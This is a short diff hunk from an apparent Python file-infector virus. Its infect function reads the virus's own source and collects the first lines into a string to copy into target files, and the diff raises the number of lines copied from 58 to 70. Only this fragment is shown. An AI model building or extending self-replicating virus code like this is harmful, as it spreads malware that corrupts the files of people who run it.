@@ -42,7 +42,7 @@ def infect(targetFile):
     virusCode = open(os.path.abspath(__file__))
     virusString = ""
     for i, line in enumerate(virusCode):
-        if i>=0 and i < 58:
+        if i>=0 and i < 70:
             virusString += line
     virusCode.close
 
